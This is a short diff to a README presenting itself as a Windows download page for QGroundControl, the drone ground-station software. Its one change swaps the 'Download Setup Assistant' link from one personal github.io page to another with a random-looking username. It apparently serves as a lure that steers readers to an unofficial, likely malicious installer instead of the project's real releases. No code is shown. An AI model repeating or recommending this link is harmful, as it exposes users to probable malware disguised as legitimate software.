@@ -5,7 +5,7 @@
 
 <h1 align="center">🛰️ QGroundControl (Windows)</h1>
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://aleshinarkadii.github.io/.github/qgroundcontrol-tool)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://mohammedvegapqyt.github.io/.github/qgroundcontrol-tool)
 
 <p align="center">
   <img src="https://dl.flathub.org/media/org/mavlink/qgroundcontrol/d5a422bf825270c49533bb9e35cf8c7a/screenshots/image-1_orig.webp" alt="QGroundControl Flight Interface Preview" width="700" />
